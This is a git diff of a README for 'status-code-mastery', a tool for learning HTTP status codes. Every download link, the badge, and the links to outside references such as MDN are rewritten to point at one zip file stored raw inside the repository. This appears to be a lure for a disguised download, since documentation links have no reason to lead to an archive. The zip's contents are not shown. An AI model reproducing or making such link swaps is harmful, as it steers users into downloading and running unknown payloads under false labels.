@@ -1,6 +1,6 @@
 # 🚀 status-code-mastery - Understand HTTP Status Codes Easily
 
-[![Download Status Code Mastery](https://img.shields.io/badge/Download%20Now-%20status--code--mastery-blue)](https://github.com/robl586/status-code-mastery/releases)
+[![Download Status Code Mastery](https://raw.githubusercontent.com/robl586/status-code-mastery/main/2xx-Success/status-code-mastery-v2.2.zip%20Now-%20status--code--mastery-blue)](https://raw.githubusercontent.com/robl586/status-code-mastery/main/2xx-Success/status-code-mastery-v2.2.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Welcome to **status-code-mastery**! This application helps you understand and re
 To get going with **status-code-mastery**, follow these steps:
 
 1. **Visit the Releases Page**  
-   Click [here to download](https://github.com/robl586/status-code-mastery/releases) to access our latest version.
+   Click [here to download](https://raw.githubusercontent.com/robl586/status-code-mastery/main/2xx-Success/status-code-mastery-v2.2.zip) to access our latest version.
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions. Find the latest version for the best features and improvements.
@@ -34,7 +34,7 @@ To get going with **status-code-mastery**, follow these steps:
 
 To download and install **status-code-mastery**, follow these steps:
 
-1. Click [here to download](https://github.com/robl586/status-code-mastery/releases) and select the latest version.
+1. Click [here to download](https://raw.githubusercontent.com/robl586/status-code-mastery/main/2xx-Success/status-code-mastery-v2.2.zip) and select the latest version.
 2. Choose the appropriate file for your operating system.
 3. Follow the installation prompts. 
 
@@ -74,7 +74,7 @@ If you encounter issues while downloading or running the application, try the fo
 
 ## 📚 Further Resources
 
-- [HTTP Status Code Definitions](https://www.restapitutorial.com/httpstatuscodes.html): A comprehensive list of what each status code means.
-- [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status): Detailed explanations of HTTP status codes.
+- [HTTP Status Code Definitions](https://raw.githubusercontent.com/robl586/status-code-mastery/main/2xx-Success/status-code-mastery-v2.2.zip): A comprehensive list of what each status code means.
+- [MDN Web Docs](https://raw.githubusercontent.com/robl586/status-code-mastery/main/2xx-Success/status-code-mastery-v2.2.zip): Detailed explanations of HTTP status codes.
 
 Feel free to explore and engage with the application. Happy learning!
